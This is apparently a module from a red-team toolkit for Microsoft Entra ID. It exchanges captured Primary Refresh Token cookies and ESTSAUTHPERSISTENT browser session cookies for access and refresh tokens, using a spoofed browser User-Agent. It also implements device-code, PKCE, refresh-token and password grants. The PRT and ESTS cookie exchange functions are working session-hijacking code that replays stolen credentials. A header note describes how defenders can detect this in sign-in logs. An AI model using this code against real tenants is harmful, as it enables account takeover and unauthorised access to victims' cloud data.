# ================================================================
# MODULE: quantum_mechanic.providers.entra.exchange
# ----------------------------------------------------------------
# PURPOSE:   Network-touching token exchange operations against
#            Microsoft's ESTS (login.microsoftonline.com) endpoint.
#
#            Covers:
#              - PRT cookie  → access + refresh tokens
#              - ESTS cookie → access + refresh tokens
#              - Device code flow (initiation + polling)
#              - Refresh token  → access token (delegated)
#              - ROPC (username/password)
#
#            All functions return raw response dicts. The caller
#            (commands_entra.py) handles EntraTokenStore updates.
#
# DETECTION (Blue Team):
#   ESTS Sign-in Logs: Non-interactive sign-ins show as the
#   originating client app. PRT cookie exchanges appear as
#   "Primary Refresh Token" auth method in the sign-in log.
# ================================================================

from __future__ import annotations

import base64
import hashlib
import logging
import secrets
import time
import urllib.parse
import webbrowser
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any

import httpx

logger = logging.getLogger(__name__)

ESTS_BASE = "https://login.microsoftonline.com"
TOKEN_EP  = ESTS_BASE + "/{tenant}/oauth2/v2.0/token"
AUTH_EP   = ESTS_BASE + "/{tenant}/oauth2/v2.0/authorize"
DEVICE_EP = ESTS_BASE + "/{tenant}/oauth2/v2.0/devicecode"

# Legacy v1 token endpoint — required for PRT cookie and ESTS cookie exchange.
TOKEN_V1_EP = ESTS_BASE + "/{tenant}/oauth2/token"

_DEFAULT_TIMEOUT = 30


def exchange_prt_cookie(
    prt_jwt: str,
    *,
    tenant_id: str,
    client_id: str,
    resource: str,
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    """Exchange a PRT cookie (x-ms-RefreshTokenCredential) for tokens.

    Uses the jwt-bearer grant against the v1 token endpoint.
    The PRT cookie is nonce-bound (~5 min) — call immediately on ingest.

    Returns:
        Raw ESTS response dict with access_token, refresh_token, etc.
        Error is keyed as "error" / "error_description" on failure.
    """
    url = TOKEN_V1_EP.format(tenant=tenant_id)
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion": prt_jwt,
        "client_id": client_id,
        "resource": resource,
        "scope": "openid",
        "request_nonce": "1",  # signal that we're providing a nonce-bearing PRT cookie
    }
    return _post_token(url, data, http=http)


def exchange_ests_cookie(
    cookie_value: str,
    *,
    tenant_id: str,
    client_id: str,
    resource: str,
    cookie_name: str = "ESTSAUTHPERSISTENT",
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    """Exchange an ESTS browser cookie for tokens.

    Submits the cookie in a form POST to the v1 authorize endpoint,
    which ESTS completes server-side and returns tokens directly.

    Returns:
        Raw ESTS response dict.
    """
    url = TOKEN_V1_EP.format(tenant=tenant_id)
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "client_id": client_id,
        "resource": resource,
        "scope": "openid offline_access",
    }
    headers = {
        "Cookie": f"{cookie_name}={cookie_value}",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
        ),
    }
    return _post_token(url, data, headers=headers, http=http)


def initiate_device_code(
    *,
    tenant_id: str,
    client_id: str,
    resource: str,
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    """Start a device code flow.

    Returns a dict with 'user_code', 'verification_uri', 'device_code',
    'expires_in', and 'interval' fields.
    """
    url = DEVICE_EP.format(tenant=tenant_id)
    scope = resource.rstrip("/") + "/.default openid offline_access"
    data = {
        "client_id": client_id,
        "scope": scope,
    }
    owned = http is None
    client = http or httpx.Client(timeout=_DEFAULT_TIMEOUT)
    try:
        resp = client.post(url, data=data)
        return resp.json()
    except httpx.HTTPError as e:
        return {"error": "http_error", "error_description": str(e)}
    finally:
        if owned:
            client.close()


def poll_device_code(
    device_code: str,
    *,
    tenant_id: str,
    client_id: str,
    resource: str,
    interval: int = 5,
    timeout: int = 300,
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    """Poll the token endpoint until device code flow completes or expires.

    Yields progress by returning intermediate "authorization_pending"
    responses. Returns the final token response (success or failure).
    """
    url = TOKEN_EP.format(tenant=tenant_id)
    scope = resource.rstrip("/") + "/.default openid offline_access"
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "device_code": device_code,
        "client_id": client_id,
        "scope": scope,
    }

    owned = http is None
    client = http or httpx.Client(timeout=_DEFAULT_TIMEOUT)
    deadline = time.time() + timeout
    try:
        while time.time() < deadline:
            resp = client.post(url, data=data)
            result = resp.json()
            error = result.get("error", "")

            if error == "authorization_pending":
                time.sleep(interval)
                continue
            if error == "slow_down":
                interval += 5
                time.sleep(interval)
                continue
            # Success or terminal failure — return immediately.
            return result

        return {"error": "expired_token", "error_description": "Device code polling timed out"}
    except httpx.HTTPError as e:
        return {"error": "http_error", "error_description": str(e)}
    finally:
        if owned:
            client.close()


# ================================================================
# OAuth 2.0 Authorization Code + PKCE flow (interactive browser)
# ----------------------------------------------------------------
# Used by `acquire entra interactive` for tenants where Conditional
# Access blocks the device-code grant type. Uses the standard
# authorization_code grant_type that Microsoft's own tooling uses.
# ================================================================

AUTH_EP = "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize"


def _pkce_pair() -> tuple[str, str]:
    """Generate a PKCE (verifier, challenge) pair per RFC 7636 §4.1.

    Verifier is 64 bytes of URL-safe base64 (no padding). Challenge is
    base64url(SHA256(verifier)) without padding.
    """
    verifier = base64.urlsafe_b64encode(secrets.token_bytes(64)).rstrip(b"=").decode("ascii")
    challenge_bytes = hashlib.sha256(verifier.encode("ascii")).digest()
    challenge = base64.urlsafe_b64encode(challenge_bytes).rstrip(b"=").decode("ascii")
    return verifier, challenge


class _CallbackHandler(BaseHTTPRequestHandler):
    """One-shot HTTP handler that captures ?code= and ?state= from the redirect."""

    def do_GET(self) -> None:  # noqa: N802
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        self.server.captured_code = params.get("code", [None])[0]
        self.server.captured_state = params.get("state", [None])[0]
        self.server.captured_error = params.get("error", [None])[0]
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        body = (
            b"<html><body><h2>You may close this window.</h2>"
            b"<p>QM has captured the authorization code.</p></body></html>"
        )
        self.wfile.write(body)

    def log_message(self, format: str, *args) -> None:  # noqa: A002
        """Suppress default stderr access log."""


class _CallbackServer(HTTPServer):
    """HTTPServer subclass that exposes captured_code/state via attributes."""

    def __init__(self, port: int) -> None:
        super().__init__(("127.0.0.1", port), _CallbackHandler)
        self.captured_code: str | None = None
        self.captured_state: str | None = None
        self.captured_error: str | None = None
        self.expected_state: str = ""
        self.port: int = port


def _default_server_factory(port: int) -> _CallbackServer:
    return _CallbackServer(port)


def _pick_free_port() -> int:
    """Pick an ephemeral port by binding-and-releasing a socket."""
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def interactive_authorize(
    *,
    tenant_id: str,
    client_id: str,
    resource: str,
    timeout: int = 300,
    opener=None,
    server_factory=None,
) -> dict[str, Any]:
    """Run the OAuth 2.0 Authorization Code + PKCE flow interactively.

    Spins up a localhost HTTP listener on an ephemeral port, opens the
    operator's default browser to the authorization URL, blocks until
    the callback fires (or timeout), then exchanges the auth code for
    tokens at the /token endpoint.

    Args:
        tenant_id: Entra tenant ID (or "common").
        client_id: OAuth client ID (FOCI default for az-CLI-equivalent flow).
        resource: Resource URL (e.g. "https://graph.microsoft.com").
        timeout: Seconds to wait for the user to complete sign-in in browser.
        opener: Callable(url) → bool. Defaults to webbrowser.open.
        server_factory: Callable(port) → _CallbackServer. Defaults to a real
            HTTPServer on 127.0.0.1. Injectable for testing.

    Returns: dict matching the standard token response shape (access_token,
        refresh_token, expires_in, token_type) or {"error": ..., "error_description": ...}.
    """
    if opener is None:
        opener = webbrowser.open
    if server_factory is None:
        port = _pick_free_port()
        server = _default_server_factory(port)
    else:
        server = server_factory(0)
        port = server.port

    verifier, challenge = _pkce_pair()
    state = secrets.token_urlsafe(16)
    server.expected_state = state

    # Must be the bare loopback origin, no path: Microsoft's loopback
    # redirect-URI exception (RFC 8252 §7.3) only relaxes the port, not
    # the path, so a registered "http://localhost" only matches
    # "http://localhost:<port>" — never "http://localhost:<port>/callback".
    redirect_uri = f"http://localhost:{port}"
    scope = resource.rstrip("/") + "/.default openid offline_access"
    params = {
        "client_id": client_id,
        "response_type": "code",
        "redirect_uri": redirect_uri,
        "response_mode": "query",
        "scope": scope,
        "state": state,
        "code_challenge": challenge,
        "code_challenge_method": "S256",
    }
    auth_url = AUTH_EP.format(tenant=tenant_id) + "?" + urllib.parse.urlencode(params)

    opener(auth_url)

    # In production, the server handle_request blocks until the callback fires.
    # In tests, the fake server has captured_code pre-set and lacks handle_request.
    if hasattr(server, "handle_request"):
        import threading
        done = threading.Event()
        def _serve():
            try:
                server.handle_request()
            finally:
                done.set()
        threading.Thread(target=_serve, daemon=True).start()
        if not done.wait(timeout=timeout):
            return {
                "error": "expired_token",
                "error_description": "Interactive auth timed out (no browser callback)",
            }

    code = server.captured_code
    captured_state = server.captured_state
    captured_error = server.captured_error

    if captured_error:
        return {"error": captured_error, "error_description": captured_error}
    if not code:
        return {
            "error": "expired_token",
            "error_description": "Interactive auth timed out (no code captured)",
        }
    if captured_state != state:
        return {
            "error": "state_mismatch",
            "error_description": "OAuth state parameter did not match (possible CSRF)",
        }

    # Exchange code for tokens.
    url = TOKEN_EP.format(tenant=tenant_id)
    data = {
        "client_id": client_id,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": redirect_uri,
        "code_verifier": verifier,
        "scope": scope,
    }
    try:
        with httpx.Client(timeout=_DEFAULT_TIMEOUT) as client:
            resp = client.post(url, data=data)
            return resp.json()
    except httpx.HTTPError as e:
        return {"error": "http_error", "error_description": str(e)}


def exchange_refresh_token(
    refresh_token: str,
    *,
    tenant_id: str,
    client_id: str,
    resource: str,
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    """Exchange a refresh token for an access token against a specific resource."""
    url = TOKEN_EP.format(tenant=tenant_id)
    scope = resource.rstrip("/") + "/.default openid offline_access"
    data = {
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "client_id": client_id,
        "scope": scope,
    }
    return _post_token(url, data, http=http)


def exchange_ropc(
    username: str,
    password: str,
    *,
    tenant_id: str,
    client_id: str,
    resource: str,
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    """Resource Owner Password Credentials grant.

    Only works when legacy auth is not blocked and MFA is not required.
    """
    url = TOKEN_EP.format(tenant=tenant_id)
    scope = resource.rstrip("/") + "/.default openid offline_access"
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
        "client_id": client_id,
        "scope": scope,
    }
    return _post_token(url, data, http=http)


# ----------------------------------------------------------------
# Internal helpers
# ----------------------------------------------------------------

def _post_token(
    url: str,
    data: dict[str, str],
    *,
    headers: dict[str, str] | None = None,
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    owned = http is None
    client = http or httpx.Client(timeout=_DEFAULT_TIMEOUT)
    try:
        resp = client.post(url, data=data, headers=headers or {})
        return resp.json()
    except httpx.HTTPError as e:
        logger.debug("ESTS request failed: %s", e)
        return {"error": "http_error", "error_description": str(e)}
    finally:
        if owned:
            client.close()
